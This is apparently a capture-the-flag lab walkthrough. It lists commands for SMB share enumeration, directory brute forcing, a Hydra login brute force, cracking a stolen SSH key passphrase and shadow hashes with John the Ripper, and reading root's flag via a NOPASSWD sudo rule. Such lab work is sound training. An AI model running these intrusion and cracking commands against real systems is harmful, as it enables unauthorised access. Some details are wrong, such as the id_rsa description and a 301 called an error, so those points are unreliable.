# Cybersecurity Enumeration & Exploitation Commands

## 1. SMB Share Enumeration (NetExec)

```bash
nxc smb <ip> --shares
```
- Enumerate SMB shares without specifying a user.

```bash
nxc smb <ip> -u <user> -p <password> --shares
```
- Enumerate SMB shares using credentials.
- Valid username and password: Displays the file shares accessible to the authenticated account.
- Invalid/random username and password: May fall back to guest access if the SMB server permits it, displaying what the guest account can access.
- Look into non-default file shares. I believe it is workshares if my memory doesn't fail me as it is non-default.

---
## 2. Directory, File & DNS Enumeration (Gobuster)


Gobuster - Used to discover directories, files and DNS subdomains on a target.


```bash
gobuster dir -u MACHINE_IP -w <wordlist>
```

**Example:**



```bash
gobuster dir -u 10.49.144.55 -w /usr/share/wordlists/rockyou.txt
```

We have identified that /admin is the anomaly since it returned an error code of 301.

---

## 3. Web Login Brute Force (Hydra)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.186.47 http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid"
```

We can download the id_rsa from /admin.

---

## 4. SSH Private Key Password Cracking (John the Ripper)  

With id_rsa private key (doesn't end with .pub and content says public key), we can do a bit of funny. >:)

```bash
ssh2john id_rsa > output_hash.txt
```

```bash
john output_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Once the password is recovered, SSH into the machine using the private key and with the passphrase we obtained:

```bash
ssh -i /path/to/ida_rsa user@ip
```

---

## 5. Linux Privilege Enumeration

We are now John on target. We can retrieve user flag here.  

```bash
cat user.txt
```

Then we can enumerate our sudo permissions and we figure out that we can run CAT as root with nopasswd.

```bash
sudo -l
```

---

## 6. Linux Password Hash Cracking


Combine the passwd and shadow files so that Mr John understands the syntax of linux account (account name, hash and other details) for cracking in the next step:

```bash
unshadow passwd.txt shadow.txt > unshadow.txt
```


The hashes, tied to the account, are cracked using John the Ripper:

```bash
john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Then we can su to root to retrieve root.txt

```bash
su root
```

P.S. YOU CAN ACTUALLY CHEAT SINCE YOU KNOW THAT CAT HAS NOPASSWD and executes as ROOT.  

```bash
cat /root/root.txt
```

When you finished sudo -l, you can just run:

```bash
sudo cat /root/root.txt
```

If you knew root.txt would probably be in /root directory.

But that wouldn't be fun if you shortcutted your way hehe.
